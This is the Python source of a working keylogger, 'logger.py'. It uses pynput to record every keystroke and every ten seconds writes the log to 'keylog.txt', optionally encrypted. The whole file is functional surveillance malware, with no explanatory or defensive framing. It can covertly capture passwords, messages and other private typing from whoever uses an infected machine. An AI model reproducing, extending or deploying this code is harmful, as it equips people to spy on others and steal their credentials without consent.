# logger.py
import pynput.keyboard
import threading

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{key}] "

def write_log(encrypt_function=None, key=None):
    global log
    if encrypt_function:
        encrypted_log = encrypt_function(log, key)
        with open("keylog.txt", "ab") as file:
            file.write(encrypted_log + b"\n")
    else:
        with open("keylog.txt", "a") as file:
            file.write(log)
    log = ""
    timer = threading.Timer(10, write_log, [encrypt_function, key])
    timer.start()

def start_keylogger(encrypt_function=None, key=None):
    keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
    with keyboard_listener:
        write_log(encrypt_function, key)
        keyboard_listener.join()
